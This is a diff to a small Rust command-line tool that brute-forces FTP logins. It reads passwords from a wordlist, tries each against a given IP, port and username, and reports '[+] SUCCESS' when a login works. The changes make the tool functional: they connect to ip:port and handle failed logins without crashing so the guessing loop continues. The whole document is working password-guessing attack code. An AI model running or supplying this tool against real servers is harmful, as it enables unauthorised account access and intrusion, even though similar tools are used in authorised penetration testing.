@@ -27,10 +27,8 @@ impl Default for Config {
 }
 
 fn main() {
-    let args: Vec<String> = env::args().collect();
     let mut config = Config::default();
-
-    println!("{:?}", args);
+    let args: Vec<String> = env::args().collect();
 
     for (index, arg) in args.iter().enumerate() {
         //ip
@@ -57,30 +55,39 @@ fn main() {
             config.num_threads = args[index + 1].clone();
         }
     }
-
     process_wordlist(config);
 }
 
-fn process_wordlist(config : Config) {
+fn process_wordlist(config: Config) {
     //open the wordlist file
     if let Ok(file) = File::open(config.file) {
         //read file rows
         for line in io::BufReader::new(file).lines() {
             if let Ok(word) = line {
-                println!("[...] TRYING: {}", word);
-                ftp_connect(&config.ip, &config.port, &config.username, &word);
+                //handling ftp connection
+                match ftp_connect(&config.ip, &config.port, &config.username, &word) {
+                    Ok(_) => {
+                        println!("[+] SUCCESS: {}", word);
+                        std::process::exit(0);
+                    }
+                    Err(_e) => {
+                        println!("[-] FAILED: {}", word);
+                    }
+                }
             }
         }
     } else {
         print!("ERROR: Error opening wordlist file.")
     }
 }
-
-fn ftp_connect(ip: &str, port: &str, username: &str, password: &str) {
-    let mut ftp_stream =
-        FtpStream::connect(ip).unwrap_or_else(|err| panic!("Error connect {}", err));
-    let _ = ftp_stream
-        .login(username, password)
-        .unwrap_or_else(|err| panic!("Error login {}", err));
+fn ftp_connect(
+    ip: &str,
+    port: &str,
+    username: &str,
+    password: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let mut ftp_stream = FtpStream::connect(&format!("{}:{}", &ip, &port))?;
+    let _ = ftp_stream.login(username, password)?;
     let _ = ftp_stream.quit();
+    Ok(())
 }
